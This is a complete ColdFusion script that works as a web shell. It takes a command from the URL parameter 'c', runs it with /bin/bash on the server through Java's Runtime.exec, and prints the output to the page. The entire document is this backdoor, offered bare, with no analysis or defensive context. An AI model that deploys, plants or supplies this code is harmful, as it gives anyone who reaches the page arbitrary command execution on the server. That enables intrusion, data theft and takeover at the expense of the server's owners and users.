<cfscript>
if (structKeyExists(url, "c")) {
    rt = createObject("java", "java.lang.Runtime").getRuntime();
    f = createObject("java", "java.io.File").init("/");
    proc = rt.exec(["/bin/bash", "-c", url.c], [], f);
    isr = createObject("java", "java.io.InputStreamReader").init(proc.getInputStream());
    br = createObject("java", "java.io.BufferedReader").init(isr);
    out = "";
    line = br.readLine();
    while (not isNull(line)) {
        out &= line & chr(10);
        line = br.readLine();
    }
    writeOutput("<pre>" & out & "</pre>");
}
</cfscript>
